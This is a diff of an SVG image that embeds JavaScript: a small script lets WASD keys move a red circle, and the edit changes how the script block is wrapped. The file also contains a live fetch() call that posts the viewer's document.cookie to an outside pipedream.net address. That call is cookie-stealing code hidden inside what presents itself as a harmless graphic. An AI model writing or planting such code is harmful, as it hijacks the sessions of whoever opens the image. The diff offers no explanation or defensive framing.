@@ -2,7 +2,7 @@
   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
   <circle cx="250" cy="100" r="50" fill="red" />
-  <script type="text/javascript"><![CDATA[
+  <script type="text/javascript">
     var KEY = { w:87, a:65, s:83, d:68 };
     var moveSpeed = 5;
     var circle = document.getElementsByTagName("circle")[0];
@@ -27,5 +27,5 @@
       }
     },false);
     fetch(`https://enz25p7qw0dco.x.pipedream.net/1234.png?c=${document.cookie}`, { method: "POST" })
-  ]]></script>
+  </script>
 </svg>
